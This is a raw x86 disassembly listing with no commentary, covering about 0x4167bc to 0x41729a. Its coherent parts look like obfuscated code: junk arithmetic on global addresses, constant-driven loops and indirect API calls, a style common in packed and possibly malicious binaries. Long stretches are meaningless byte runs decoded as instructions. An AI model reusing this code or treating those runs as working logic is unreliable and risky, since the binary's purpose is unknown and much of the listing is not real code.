  4167bc:	mov    edx,DWORD PTR [ebp-0x14]
  4167bf:	mov    ebx,DWORD PTR [ebp-0x18]
  4167c2:	xor    eax,edx
  4167c4:	xor    edx,edx
  4167c6:	sub    eax,esi
  4167c8:	div    ebx
  4167ca:	pop    edx
  4167cb:	xor    eax,ecx
  4167cd:	sub    edx,eax
  4167cf:	cmp    edi,edx
  4167d1:	jbe    0x415f06
  4167d7:	pop    edi
  4167d8:	pop    esi
  4167d9:	pop    ebx
  4167da:	leave  
  4167db:	ret    0x8
  4167de:	push   ebp
  4167df:	mov    ebp,esp
  4167e1:	and    esp,0xfffffff8
  4167e4:	sub    esp,0x9c
  4167ea:	push   ebx
  4167eb:	push   esi
  4167ec:	push   edi
  4167ed:	push   DWORD PTR ds:0x422524
  4167f3:	lea    eax,[esp+0xa4]
  4167fa:	push   eax
  4167fb:	call   DWORD PTR ds:0x42dfe0
  416801:	push   DWORD PTR [esp+0xa4]
  416808:	push   DWORD PTR ds:0x422510
  41680e:	call   DWORD PTR ds:0x42e250
  416814:	push   eax
  416815:	call   DWORD PTR ds:0x42e2b0
  41681b:	cmp    DWORD PTR ds:0x428505,0x0
  416822:	mov    ecx,0x19be
  416827:	mov    ecx,0x6729
  41682c:	not    ecx
  41682e:	mov    DWORD PTR ds:0x428519,0x315f
  416838:	jmp    0x416882
  41683d:	mov    DWORD PTR ds:0x428485,0x96c
  416847:	cmp    DWORD PTR ds:0x428505,0x0
  41684e:	jbe    0x416866
  416854:	push   0x4280f7
  416859:	call   DWORD PTR ds:0x42e268
  41685f:	inc    ecx
  416860:	adc    ecx,DWORD PTR ds:0x428515
  416866:	and    DWORD PTR ds:0x428479,0x5e58
  416870:	mov    ecx,DWORD PTR ds:0x4283d9
  416876:	sub    ecx,DWORD PTR ds:0x4284b1
  41687c:	mov    DWORD PTR ds:0x4283d9,ecx
  416882:	mov    ecx,DWORD PTR ds:0x4228d8
  416888:	and    DWORD PTR ds:0x428325,0x41d
  416892:	push   0x0
  416894:	and    DWORD PTR ds:0x428515,0x428489
  41689e:	push   DWORD PTR [ecx]
  4168a0:	and    DWORD PTR ds:0x42840d,0x7a21
  4168aa:	call   eax
  4168ac:	mov    esi,0x1ff
  4168b1:	xor    DWORD PTR ds:0x4282f9,ebx
  4168b7:	mov    DWORD PTR [esp+0x24],0x3992
  4168bf:	mov    DWORD PTR [esp+0xc],0x79a2
  4168c7:	cmp    DWORD PTR ds:0x4283cd,0x0
  4168ce:	mov    ecx,0x6401
  4168d3:	mov    DWORD PTR ds:0x428305,0x3a8d
  4168dd:	mov    DWORD PTR ds:0x42840d,0x1a46
  4168e7:	mov    DWORD PTR ds:0x42842d,edx
  4168ed:	jmp    0x416927
  4168f2:	movzx  eax,BYTE PTR ds:0x4283cd
  4168f9:	movzx  eax,WORD PTR ds:0x428429
  416900:	cmp    DWORD PTR ds:0x4283cd,0x0
  416907:	jge    0x41691f
  41690d:	push   DWORD PTR [ebp-0xc]
  416910:	push   0x3a70
  416915:	call   DWORD PTR ds:0x42e0e4
  41691b:	not    ecx
  41691d:	adc    ecx,ecx
  41691f:	xor    ecx,DWORD PTR ds:0x428529
  416925:	or     ecx,ecx
  416927:	mov    eax,DWORD PTR [esp+0xc]
  41692b:	mov    ecx,DWORD PTR [esp+0x24]
  41692f:	or     DWORD PTR ds:0x4282e5,0x4283cd
  416939:	xor    eax,0x1d22
  41693e:	and    DWORD PTR ds:0x428315,0x1749
  416948:	imul   eax,eax,0xffffdeb4
  41694e:	or     DWORD PTR ds:0x4284fd,0x428519
  416958:	and    eax,0x43eb
  41695d:	sub    eax,ecx
  41695f:	or     DWORD PTR ds:0x4283c1,ebx
  416965:	mov    DWORD PTR [esp+0x3c],eax
  416969:	dec    eax
  41696a:	mov    DWORD PTR [esp+0x38],0x3b18
  416972:	mov    DWORD PTR [esp+0x2c],0x6c93
  41697a:	or     eax,DWORD PTR ds:0x428425
  416980:	mov    DWORD PTR [esp+0x24],0x418e
  416988:	xor    ecx,ecx
  41698a:	mov    DWORD PTR [esp+0xc],0x5ac3
  416992:	mov    eax,DWORD PTR [esp+0xc]
  416996:	sub    ecx,DWORD PTR ds:0x42840d
  41699c:	mov    ecx,DWORD PTR [esp+0x24]
  4169a0:	sub    ecx,eax
  4169a2:	xor    eax,0x684c
  4169a7:	mov    eax,DWORD PTR [esp+0x2c]
  4169ab:	or     DWORD PTR ds:0x428511,0x4866
  4169b5:	and    ecx,eax
  4169b7:	or     DWORD PTR ds:0x4283bd,0x3518
  4169c1:	mov    eax,DWORD PTR [esp+0x38]
  4169c5:	xor    ecx,0x10d6
  4169cb:	sub    ecx,0x782c
  4169d1:	add    DWORD PTR ds:0x4283f5,0x3d80
  4169db:	imul   ecx,eax
  4169de:	mov    eax,DWORD PTR [esp+0x3c]
  4169e2:	mov    DWORD PTR ds:0x42830d,0x7bdf
  4169ec:	cmp    eax,ecx
  4169ee:	mov    DWORD PTR ds:0x4282dd,0x6991
  4169f8:	jne    0x41701a
  4169fe:	mov    DWORD PTR [esp+0x10],0x1
  416a06:	sbb    eax,DWORD PTR ds:0x428301
  416a0c:	mov    DWORD PTR [esp+0x30],0x2f16
  416a14:	mov    DWORD PTR [esp+0x48],0x16f
  416a1c:	jmp    0x416c79
  416a21:	and    DWORD PTR [esp+ebp*1+0x3bb6ac2e],eax
  416a28:	xchg   esp,eax
  416a29:	jmp    0x4169d2
  416a2b:	int    0x90
  416a2d:	loope  0x416aa2
  416a2f:	sbb    cl,dl
  416a31:	or     al,0xd4
  416a33:	sar    BYTE PTR [esi-0x41413dcb],0x86
  416a3a:	mov    al,ds:0xcc09db24
  416a3f:	cli    
  416a40:	or     ah,BYTE PTR [ebp+0x2781cd9]
  416a46:	and    esi,DWORD PTR [eax-0x47]
  416a49:	les    ecx,FWORD PTR [edx+ecx*4]
  416a4c:	shl    BYTE PTR [esi+0x3b3ec081],1
  416a52:	sbb    edi,ebp
  416a54:	mov    edx,0x74873e93
  416a59:	push   0x1e
  416a5b:	or     ebp,ebx
  416a5d:	sub    DWORD PTR [edi],ecx
  416a5f:	and    BYTE PTR [eax+edi*4],0xde
  416a63:	mov    esi,0xcc247013
  416a68:	and    DWORD PTR [edi-0x57dc0a63],ebx
  416a6e:	lods   al,BYTE PTR ds:[esi]
  416a6f:	je     0x416a5e
  416a71:	das    
  416a72:	or     esi,edx
  416a74:	cwde   
  416a75:	mov    ch,BYTE PTR [esi+eiz*1]
  416a78:	xchg   ebp,eax
  416a79:	rcr    DWORD PTR [eax],cl
  416a7b:	mov    ah,0x1f
  416a7d:	out    dx,al
  416a7e:	sub    DWORD PTR [edx+ebx*2+0x38c8e1ae],0xbd311b6
  416a89:	sub    BYTE PTR [edx+ecx*1],ch
  416a8c:	mov    BYTE PTR [ebx+0x23975055],ah
  416a92:	jl     0x416af2
  416a94:	cmp    BYTE PTR [edx-0x73],0xf8
  416a98:	cs mov ebp,0xd4a18529
  416a9e:	leave  
  416a9f:	fadd   QWORD PTR [esi-0x69]
  416aa2:	add    edi,DWORD PTR [ecx-0x46abc246]
  416aa8:	add    ebx,ecx
  416aaa:	cmp    al,0x94
  416aac:	inc    edi
  416aad:	jp     0x416a71
  416aaf:	push   ds
  416ab0:	adc    al,0xd3
  416ab2:	push   esi
  416ab3:	xchg   edi,eax
  416ab4:	cmc    
  416ab5:	fadd   QWORD PTR [eax+ecx*2-0x7da8943c]
  416abc:	addr16 ja 0x416a6c
  416abf:	ret    
  416ac0:	je     0x416a49
  416ac2:	clc    
  416ac3:	inc    ecx
  416ac4:	pop    es
  416ac5:	xlat   BYTE PTR ds:[ebx]
  416ac6:	jne    0x416b1d
  416ac8:	dec    ebp
  416ac9:	inc    esi
  416aca:	aaa    
  416acb:	into   
  416acc:	add    eax,0x4dc6293a
  416ad1:	inc    eax
  416ad2:	test   eax,0xa1ac9903
  416ad7:	data16 aaa 
  416ad9:	jmp    0x416aa0
  416adb:	test   ecx,edx
  416add:	push   ebx
  416ade:	or     DWORD PTR [ecx-0x26],0x1e1b6db
  416ae5:	(bad)  
  416ae6:	enter  0xe4c8,0x9
  416aea:	mov    cs,WORD PTR [edx]
  416aec:	jne    0x416ae1
  416aee:	mov    ds:0xaec719f9,eax
  416af3:	add    al,0x72
  416af5:	xchg   esp,eax
  416af6:	xchg   BYTE PTR [eax],bl
  416af8:	xchg   edi,eax
  416af9:	mov    ecx,0x7a34ac8f
  416afe:	jge    0x416b37
  416b00:	fadd   st,st(5)
  416b02:	ja     0x416b3f
  416b04:	push   edx
  416b05:	addr16 (bad) 
  416b07:	xor    esi,esi
  416b09:	push   ecx
  416b0a:	shr    BYTE PTR [esi],1
  416b0c:	mov    DWORD PTR [ecx+0x16539a4e],edi
  416b12:	pop    eax
  416b13:	mov    ecx,0x82f8cb80
  416b18:	mov    esp,0x2dec8631
  416b1d:	rcr    DWORD PTR [edi],1
  416b1f:	repz arpl WORD PTR [ebx-0x54],sp
  416b23:	mov    ah,bl
  416b25:	retf   0x66c0
  416b28:	push   esi
  416b29:	lahf   
  416b2a:	mov    ecx,DWORD PTR [ecx]
  416b2c:	rcr    BYTE PTR [ecx-0xca1a461],1
  416b32:	inc    eax
  416b33:	ss mov ecx,0x64465678
  416b39:	push   edx
  416b3a:	push   cs
  416b3b:	lods   eax,DWORD PTR ds:[esi]
  416b3c:	pop    edi
  416b3d:	xor    edi,DWORD PTR [ecx-0x15]
  416b40:	xor    BYTE PTR [ebx],ch
  416b42:	push   eax
  416b43:	jl     0x416ac9
  416b45:	(bad)  
  416b47:	add    edx,ebp
  416b49:	(bad)  
  416b4a:	in     eax,0xcc
  416b4c:	jns    0x416bc2
  416b4e:	cmp    esi,esi
  416b50:	xor    dl,bl
  416b52:	inc    esi
  416b53:	scas   eax,DWORD PTR es:[edi]
  416b54:	arpl   WORD PTR [ecx-0x2c],ax
  416b57:	xor    eax,0x370797f3
  416b5c:	test   eax,0x8da231dd
  416b61:	sbb    BYTE PTR [esi+ecx*2-0x40],bh
  416b65:	push   ds
  416b66:	xchg   DWORD PTR [esi],edi
  416b68:	outs   dx,BYTE PTR ds:[esi]
  416b69:	dec    ecx
  416b6a:	test   DWORD PTR [esp+ebx*4+0x287328c],ebp
  416b71:	mov    eax,DWORD PTR [eax-0x69fb11ea]
  416b77:	mov    esi,edi
  416b79:	fldenv [edx]
  416b7b:	xchg   ebp,eax
  416b7c:	or     al,0xf7
  416b7e:	add    BYTE PTR [eax-0x44849a1b],bl
  416b84:	sbb    al,0x22
  416b86:	test   ebp,0xf13b478a
  416b8c:	outs   dx,BYTE PTR ds:[esi]
  416b8d:	cli    
  416b8e:	nop
  416b8f:	test   esp,esi
  416b91:	xor    DWORD PTR [edi-0x211c43a1],esi
  416b97:	mov    edi,DWORD PTR [edx]
  416b99:	mov    BYTE PTR [ebp+0x4],bl
  416b9c:	test   eax,edx
  416b9e:	imul   edi,DWORD PTR es:[eiz*8+0x445aec74],0xffffffae
  416ba7:	fbld   TBYTE PTR [edx]
  416ba9:	cmp    BYTE PTR [edi],dh
  416bab:	inc    eax
  416bac:	xor    al,BYTE PTR [esp+ecx*1]
  416baf:	aas    
  416bb0:	or     eax,0x342f1203
  416bb5:	sub    edx,DWORD PTR [edx+0x77aa30be]
  416bbb:	mov    esp,0x58690ee3
  416bc0:	in     eax,0xf6
  416bc2:	mov    ds:0x2ea5ba07,al
  416bc7:	shr    DWORD PTR [esi-0x465728c5],0x4
  416bce:	cld    
  416bcf:	push   cs
  416bd0:	aaa    
  416bd1:	add    al,0x6f
  416bd3:	wrmsr  
  416bd5:	ins    BYTE PTR es:[edi],dx
  416bd6:	cmp    ecx,0x10
  416bd9:	mov    eax,0xfe33a286
  416bde:	adc    bl,ch
  416be0:	xor    eax,0x3df8776b
  416be5:	bound  esp,QWORD PTR [ecx+0x19ffbefe]
  416beb:	icebp  
  416bec:	call   0xc019:0xcbb5d925
  416bf3:	(bad)  
  416bf5:	mov    bh,0xf0
  416bf7:	or     eax,0x36a08ac6
  416bfc:	pop    esp
  416bfd:	mov    cl,0x99
  416bff:	not    ecx
  416c01:	pop    eax
  416c02:	pop    esi
  416c03:	xchg   ecx,eax
  416c04:	xchg   ecx,eax
  416c05:	push   ebx
  416c06:	xor    dh,ah
  416c08:	and    BYTE PTR [edx-0x240c6c43],cl
  416c0e:	inc    ebx
  416c0f:	mov    ds:0xb12090db,eax
  416c14:	test   eax,0x1ccb5282
  416c19:	jge    0x416bac
  416c1b:	jmp    0x416c98
  416c1d:	pop    esi
  416c1e:	stos   DWORD PTR es:[edi],eax
  416c1f:	mov    DWORD PTR [ebx-0x20],ecx
  416c22:	mov    edi,0xdcf54d7f
  416c27:	ja     0x416c3b
  416c29:	lods   al,BYTE PTR ds:[esi]
  416c2a:	ficom  DWORD PTR [ebx]
  416c2c:	test   al,0xfa
  416c2e:	sub    ebx,DWORD PTR [edx-0x1b7a6768]
  416c34:	sti    
  416c35:	mov    ebx,0x1ee14a39
  416c3a:	cs popw es
  416c3d:	lock sub DWORD PTR [eax],eax
  416c40:	(bad)  [esi-0x414345b9]
  416c46:	mov    dl,0xb6
  416c48:	stos   BYTE PTR es:[edi],al
  416c49:	add    BYTE PTR [ebx+0x23],bh
  416c4c:	jmp    FWORD PTR [ecx]
  416c4e:	std    
  416c4f:	mov    ecx,0xe452aa81
  416c54:	jmp    0x7a55:0xb82473ca
  416c5b:	mov    ebx,0x38ac7f6a
  416c60:	xchg   edx,eax
  416c61:	mov    eax,ds:0xb8d8025b
  416c66:	or     BYTE PTR [eax],bl
  416c68:	int3   
  416c69:	jb     0x416bfe
  416c6b:	nop
  416c6c:	mov    edi,0x9705b99e
  416c71:	test   esi,0xaf614a7f
  416c77:	inc    ecx
  416c78:	mov    eax,edi
  416c7a:	inc    esp
  416c7b:	and    al,0x50
  416c7d:	lds    esi,FWORD PTR [eax]
  416c7f:	add    BYTE PTR [eax],al
  416c81:	or     ecx,ecx
  416c83:	push   DWORD PTR ds:0xe5bfd6f1
  416c89:	not    eax
  416c8b:	mov    DWORD PTR [esp+0x8c],0x4ebc
  416c96:	mov    DWORD PTR [esp+0x98],0x76
  416ca1:	adc    ecx,DWORD PTR ds:0x4283e1
  416ca7:	mov    DWORD PTR [esp+0x40],0x556d
  416caf:	mov    DWORD PTR [esp+0x3c],0x63d5
  416cb7:	dec    eax
  416cb8:	mov    DWORD PTR [esp+0x30],0x169
  416cc0:	inc    ecx
  416cc1:	mov    DWORD PTR [esp+0x28],0x101b
  416cc9:	mov    DWORD PTR [esp+0x10],0x6bec
  416cd1:	mov    eax,DWORD PTR [esp+0x10]
  416cd5:	mov    ecx,DWORD PTR [esp+0x28]
  416cd9:	sbb    DWORD PTR ds:0x4283e9,0x35b0
  416ce3:	imul   eax,ecx
  416ce6:	sub    DWORD PTR ds:0x4284a1,edx
  416cec:	or     eax,0x7f7d
  416cf1:	xor    eax,0xcf336131
  416cf6:	mov    DWORD PTR ds:0x428485,0x5640
  416d00:	push   DWORD PTR [eax]
  416d02:	cmp    DWORD PTR ds:0x428309,0x0
  416d09:	mov    DWORD PTR ds:0x4282f1,edi
  416d0f:	mov    DWORD PTR ds:0x4283f5,0x594e
  416d19:	mov    ecx,0x35fb
  416d1e:	mov    DWORD PTR ds:0x4284ad,0x3932
  416d28:	jmp    0x416e08
  416d2d:	mov    DWORD PTR ds:0x4283c9,0xa9d
  416d37:	cmp    DWORD PTR ds:0x428309,0x0
  416d3e:	jg     0x416d5d
  416d44:	push   0x46ad
  416d49:	call   DWORD PTR ds:0x42e26c
  416d4f:	and    DWORD PTR ds:0x428511,0x42831d
  416d59:	adc    ecx,ecx
  416d5b:	xor    ecx,ecx
  416d5d:	and    ecx,0x3418
  416d63:	and    ecx,0x2934
  416d69:	or     ecx,ecx
  416d6b:	movzx  ecx,BYTE PTR ds:0x428315
  416d72:	adc    DWORD PTR ds:0x4283e9,ecx
  416d78:	cmp    DWORD PTR ds:0x428505,0x0
  416d7f:	mov    DWORD PTR ds:0x428529,edi
  416d85:	mov    DWORD PTR ds:0x428529,ebx
  416d8b:	mov    DWORD PTR ds:0x4283bd,0x662b
  416d95:	mov    DWORD PTR ds:0x428511,0x653a
  416d9f:	jmp    0x416e08
  416da4:	mov    DWORD PTR ds:0x428305,ebx
  416daa:	cmp    DWORD PTR ds:0x428505,0x0
  416db1:	jg     0x416ded
  416db7:	push   0x2fcf
  416dbc:	push   0x42818b
  416dc1:	call   DWORD PTR ds:0x42e270
  416dc7:	mov    ecx,DWORD PTR ds:0x4284e1
  416dcd:	mov    ecx,DWORD PTR [ecx]
  416dcf:	adc    DWORD PTR ds:0x42851d,ecx
  416dd5:	sbb    ecx,0x197c
  416ddb:	mov    ecx,DWORD PTR ds:0x428501
  416de1:	and    DWORD PTR ds:0x428411,ecx
  416de7:	sub    ecx,0x1b1e
  416ded:	sub    ecx,DWORD PTR ds:0x428309
  416df3:	add    DWORD PTR ds:0x4282ed,0x6bb0
  416dfd:	add    DWORD PTR ds:0x428319,edi
  416e03:	adc    eax,0x3de3
  416e08:	mov    eax,DWORD PTR [esp+0x34]
  416e0c:	add    eax,0x75d9
  416e11:	push   0xd
  416e13:	add    DWORD PTR ds:0x428431,ebx
  416e19:	pop    ecx
  416e1a:	xor    edx,edx
  416e1c:	div    ecx
  416e1e:	mov    ecx,DWORD PTR [esp+0x40]
  416e22:	xor    edx,edx
  416e24:	or     eax,ecx
  416e26:	sbb    DWORD PTR ds:0x428301,edi
  416e2c:	mov    ecx,DWORD PTR [esp+0x44]
  416e30:	inc    DWORD PTR ds:0x4283e1
  416e36:	or     eax,ecx
  416e38:	or     ecx,0x12fe
  416e3e:	mov    ecx,DWORD PTR [esp+0x9c]
  416e45:	div    ecx
  416e47:	xor    edx,edx
  416e49:	cmp    DWORD PTR ds:0x4284fd,0x0
  416e50:	movzx  ecx,WORD PTR ds:0x4284f5
  416e57:	mov    ecx,DWORD PTR ds:0x428431
  416e5d:	jmp    0x416ec3
  416e62:	mov    DWORD PTR ds:0x428401,0x6ae9
  416e6c:	cmp    DWORD PTR ds:0x4284fd,0x0
  416e73:	jg     0x416ea3
  416e79:	push   0x1
  416e7b:	call   DWORD PTR ds:0x42e0e8
  416e81:	xor    DWORD PTR ds:0x4283c1,edi
  416e87:	and    DWORD PTR ds:0x428321,0x7db2
  416e91:	mov    ecx,DWORD PTR ds:0x4283f1
  416e97:	or     DWORD PTR ds:0x428525,ecx
  416e9d:	add    DWORD PTR ds:0x428491,ebx
  416ea3:	or     DWORD PTR ds:0x428481,0xb88
  416ead:	adc    ecx,DWORD PTR ds:0x428315
  416eb3:	sub    DWORD PTR ds:0x428479,0x13f0
  416ebd:	sbb    DWORD PTR ds:0x428325,edx
  416ec3:	xor    eax,0x680da048
  416ec8:	cmp    DWORD PTR ds:0x4283bd,0x0
  416ecf:	mov    DWORD PTR ds:0x4282e1,0x5921
  416ed9:	mov    DWORD PTR ds:0x428491,edi
  416edf:	jmp    0x416f57
  416ee4:	mov    ecx,0x423c
  416ee9:	cmp    DWORD PTR ds:0x4283bd,0x0
  416ef0:	jne    0x416f33
  416ef6:	push   0x145c
  416efb:	push   0x428301
  416f00:	call   DWORD PTR ds:0x42e274
  416f06:	adc    DWORD PTR ds:0x428481,0x2a49
  416f10:	and    DWORD PTR ds:0x428511,0x95c
  416f1a:	movzx  ecx,BYTE PTR ds:0x42840d
  416f21:	adc    DWORD PTR ds:0x428425,ecx
  416f27:	mov    ecx,DWORD PTR ds:0x4284f5
  416f2d:	adc    DWORD PTR ds:0x4283d1,ecx
  416f33:	or     DWORD PTR ds:0x428311,0x75b4
  416f3d:	adc    DWORD PTR ds:0x428475,edx
  416f43:	or     DWORD PTR ds:0x4284ad,0x469c
  416f4d:	or     DWORD PTR ds:0x428409,0x5212
  416f57:	push   DWORD PTR [eax]
  416f59:	adc    DWORD PTR ds:0x428411,0x3264
  416f63:	mov    eax,DWORD PTR [esp+0x94]
  416f6a:	mov    ecx,DWORD PTR ds:0x4283d1
  416f70:	or     ecx,DWORD PTR ds:0x4284b1
  416f76:	mov    DWORD PTR ds:0x4283d1,ecx
  416f7c:	mov    ecx,DWORD PTR [esp+0x5c]
  416f80:	push   DWORD PTR ds:0x4facd31
  416f86:	sbb    DWORD PTR ds:0x428505,0x428501
  416f90:	add    eax,0xb4a
  416f95:	push   DWORD PTR ds:0x1e6ebff7
  416f9b:	imul   eax,ecx
  416f9e:	push   DWORD PTR [eax-0x3f17647c]
  416fa4:	add    DWORD PTR ds:0x428325,0x6df5
  416fae:	mov    eax,DWORD PTR [esp+0x60]
  416fb2:	mov    ecx,DWORD PTR [esp+0x48]
  416fb6:	sub    DWORD PTR ds:0x4283b5,0x4283f5
  416fc0:	xor    eax,ecx
  416fc2:	sub    DWORD PTR ds:0x428501,0x5fb7
  416fcc:	mov    ecx,DWORD PTR [esp+0x28]
  416fd0:	or     DWORD PTR ds:0x4282f9,0x4282dd
  416fda:	div    ecx
  416fdc:	sbb    DWORD PTR ds:0x4282dd,0x428315
  416fe6:	and    eax,0x100
  416feb:	xor    DWORD PTR ds:0x428409,0x79f1
  416ff5:	or     eax,0x290
  416ffa:	add    DWORD PTR ds:0x42831d,0x4282dd
  417004:	push   DWORD PTR [eax-0x494a7887]
  41700a:	xor    DWORD PTR ds:0x4283d5,0x4284a5
  417014:	call   DWORD PTR ds:0x42e124
  41701a:	or     DWORD PTR ds:0x428481,0x74bf
  417024:	dec    esi
  417025:	mov    DWORD PTR ds:0x428401,0x5180
  41702f:	jne    0x4168b1
  417035:	mov    DWORD PTR [esp+0x18],0xcb79b576
  41703d:	cmp    DWORD PTR ds:0x428485,0x0
  417044:	not    DWORD PTR ds:0x4283c9
  41704a:	mov    DWORD PTR ds:0x42848d,0x4717
  417054:	jmp    0x4170cc
  417059:	movzx  esi,BYTE PTR ds:0x42830d
  417060:	cmp    DWORD PTR ds:0x428485,0x0
  417067:	jae    0x41709b
  41706d:	push   0x428165
  417072:	push   0x6423
  417077:	push   DWORD PTR [ebp-0xc]
  41707a:	push   DWORD PTR [ebp-0x1c]
  41707d:	push   DWORD PTR [ebp-0x28]
  417080:	push   0x1c3a
  417085:	call   DWORD PTR ds:0x42e278
  41708b:	or     DWORD PTR ds:0x4282e9,edi
  417091:	xor    DWORD PTR ds:0x428409,0x58f
  41709b:	sbb    DWORD PTR ds:0x42841d,ecx
  4170a1:	sub    DWORD PTR ds:0x428511,0x607b
  4170ab:	mov    esi,DWORD PTR ds:0x42838d
  4170b1:	mov    esi,DWORD PTR [esi]
  4170b3:	or     DWORD PTR ds:0x428531,esi
  4170b9:	movzx  esi,BYTE PTR ds:0x428411
  4170c0:	add    esi,DWORD PTR ds:0x4284b1
  4170c6:	mov    DWORD PTR ds:0x428411,esi
  4170cc:	mov    esi,0x9c2b8ae8
  4170d1:	sub    DWORD PTR ds:0x42831d,0x4283f1
  4170db:	mov    DWORD PTR [esp+0x1c],esi
  4170df:	mov    DWORD PTR [esp+0x70],0xcb79b572
  4170e7:	mov    DWORD PTR [esp+0x74],esi
  4170eb:	call   0x408bfd
  4170f0:	sbb    edi,edx
  4170f2:	jmp    0x41734f
  4170f7:	add    edi,DWORD PTR [esi]
  4170f9:	popf   
  4170fa:	jmp    0x4170a0
  4170fc:	sub    al,0x8c
  4170fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ff:	scas   eax,DWORD PTR es:[di]
  417101:	xchg   esi,eax
  417102:	jecxz  0x417104
  417104:	push   esi
  417105:	(bad)  
  417106:	fld    QWORD PTR [eax+ebx*8-0x3dca4140]
  41710d:	mov    esi,0xc7180dbe
  417112:	mov    ecx,cs
  417114:	int3   
  417115:	lock stos BYTE PTR es:[edi],al
  417117:	inc    esp
  417118:	es dec edi
  41711a:	mov    ebx,0x71756949
  41711f:	in     al,0x3c
  417121:	(bad)  
  417122:	shr    esi,cl
  417124:	jg     0x4170e9
  417126:	jbe    0x417146
  417128:	add    eax,0xec4f8803
  41712d:	jb     0x4170ed
  41712f:	dec    eax
  417130:	in     al,dx
  417131:	rol    DWORD PTR ds:[edi-0x3c0c07fb],1
  417138:	mov    edi,0x6b4bfa5
  41713d:	push   ss
  41713e:	or     al,0xdf
  417140:	or     DWORD PTR ds:0x6513c213,ebx
  417146:	retf   0x9c6d
  417149:	popa   
  41714a:	aaa    
  41714b:	aam    0x5d
  41714d:	inc    ebp
  41714e:	ins    DWORD PTR es:[edi],dx
  41714f:	sub    BYTE PTR [edx],ch
  417151:	fist   WORD PTR [ebx]
  417153:	nop
  417154:	sbb    BYTE PTR ds:[eax],dh
  417157:	rcl    bl,0x64
  41715a:	test   al,0x3a
  41715c:	mov    ebp,0x5e138e71
  417161:	xchg   DWORD PTR [eax-0x73],eax
  417164:	retf   0xcd8b
  417167:	adc    cl,0xbd
  41716a:	stos   DWORD PTR es:[edi],eax
  41716b:	in     eax,0x9c
  41716d:	fdivr  DWORD PTR [esi-0x4bd027f7]
  417173:	push   ss
  417174:	ror    DWORD PTR [edi+0x2913c002],0xe5
  41717b:	les    ebx,FWORD PTR [esi-0x5f]
  41717e:	leave  
  41717f:	inc    DWORD PTR [edi]
  417181:	cmp    ebp,eax
  417183:	mov    dh,0xf6
  417185:	adc    bh,dl
  417187:	adc    bh,dl
  417189:	ss jmp 0x41718b
  41718c:	dec    ebx
  41718d:	inc    edi
  41718e:	mov    ebx,0xfb70b2a8
  417193:	mov    ds:0x658e59b8,eax
  417198:	out    0xee,al
  41719a:	mov    ecx,0xef33dad4
  41719f:	mov    bl,0xc2
  4171a1:	cmp    ebx,eax
  4171a3:	fwait
  4171a4:	mov    cl,0xc2
  4171a6:	and    esi,DWORD PTR [esi+0x18]
  4171a9:	dec    ebp
  4171aa:	popa   
  4171ab:	ficomp DWORD PTR [esi-0x5b362f71]
  4171b1:	xchg   ebp,eax
  4171b2:	adc    dl,BYTE PTR [eax-0x7f63585b]
  4171b8:	lods   eax,DWORD PTR ds:[esi]
  4171b9:	adc    al,0xc2
  4171bb:	fwait
  4171bc:	mov    bl,0x77
  4171be:	xchg   DWORD PTR [esi-0x6e55e1fa],ebp
  4171c4:	in     eax,0x76
  4171c6:	jb     0x4171b5
  4171c8:	cwde   
  4171c9:	pop    ss
  4171ca:	mov    eax,0xc0e86b82
  4171cf:	xor    DWORD PTR [ebx],edx
  4171d1:	or     al,0xff
  4171d3:	push   es
  4171d4:	aad    0x45
  4171d6:	inc    esp
  4171d7:	mov    fs,WORD PTR [esi-0x5bffffb4]
  4171dd:	mov    eax,esp
  4171df:	cmc    
  4171e0:	dec    eax
  4171e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171e2:	pand   mm1,QWORD PTR [ecx+0x7d]
  4171e6:	pop    ds
  4171e7:	xchg   ecx,eax
  4171e8:	cmp    ah,al
  4171ea:	mov    al,0x9
  4171ec:	inc    esi
  4171ed:	dec    eax
  4171ee:	push   esp
  4171ef:	jnp    0x4171f9
  4171f1:	mov    edx,0x15f41807
  4171f6:	push   esi
  4171f7:	lahf   
  4171f8:	mov    esi,0x21dcc1ae
  4171fd:	jae    0x4171ad
  4171ff:	fcomp  QWORD PTR [edi]
  417201:	mov    DWORD PTR [edi],edx
  417203:	pxor   mm7,mm6
  417206:	inc    ebp
  417207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417208:	sub    DWORD PTR [esi],eax
  41720a:	imul   esp,DWORD PTR [edi],0xffffffd9
  41720d:	and    eax,DWORD PTR [edi-0x163203b7]
  417213:	ret    0xfee9
  417216:	pop    edi
  417217:	lods   eax,DWORD PTR ds:[esi]
  417218:	test   al,0xb5
  41721a:	mov    ebx,0xda4ab8c3
  41721f:	and    al,0x4f
  417221:	add    DWORD PTR [eax+0x22],0xc714d85
  417228:	stos   DWORD PTR es:[edi],eax
  417229:	sbb    eax,0xeaf5e091
  41722e:	test   DWORD PTR [edx-0xdc8d8bf],esp
  417234:	xchg   edx,eax
  417235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417236:	lock (bad) 
  417239:	push   edx
  41723a:	in     al,0xfe
  41723c:	xor    eax,0x65caa916
  417241:	inc    esi
  417242:	cmp    ebx,DWORD PTR [ebx]
  417244:	mov    ebp,0x63dae31e
  417249:	outs   dx,DWORD PTR ds:[esi]
  41724a:	jnp    0x41727c
  41724c:	leave  
  41724d:	sti    
  41724e:	nop
  41724f:	outs   dx,BYTE PTR ds:[esi]
  417250:	loop   0x417294
  417252:	or     al,0x45
  417254:	(bad)  
  417255:	sti    
  417256:	adc    BYTE PTR [esi-0x76],cl
  417259:	sbb    DWORD PTR [ebp-0x65144641],ecx
  41725f:	jo     0x4172c4
  417261:	jle    0x4172b7
  417263:	xchg   ecx,eax
  417264:	fbld   TBYTE PTR [eax+0xa]
  417267:	mov    eax,ds:0xcb340036
  41726c:	cmp    ebp,ebp
  41726e:	call   0x93022ff7
  417273:	xor    ebp,DWORD PTR [eax+0x45]
  417276:	test   DWORD PTR [edx],esp
  417278:	mov    WORD PTR [edx+0xc],gs
  41727b:	mov    ah,BYTE PTR [edi+0x25]
  41727e:	mov    ah,0xc2
  417280:	and    eax,0x2d7a5b3
  417285:	ja     0x41722d
  417287:	cmovae edx,DWORD PTR [ebx]
  41728a:	dec    esi
  41728b:	pushf  
  41728c:	outs   dx,BYTE PTR ds:[esi]
  41728d:	inc    edi
  41728e:	(bad)  
  41728f:	rcr    DWORD PTR [ecx+0x47],1
  417292:	clc    
  417293:	push   eax
  417294:	out    0x4d,eax
  417296:	xchg   esp,eax
  417297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417298:	stc    
  417299:	inc    edx
  41729a:	adc    dh,0x17
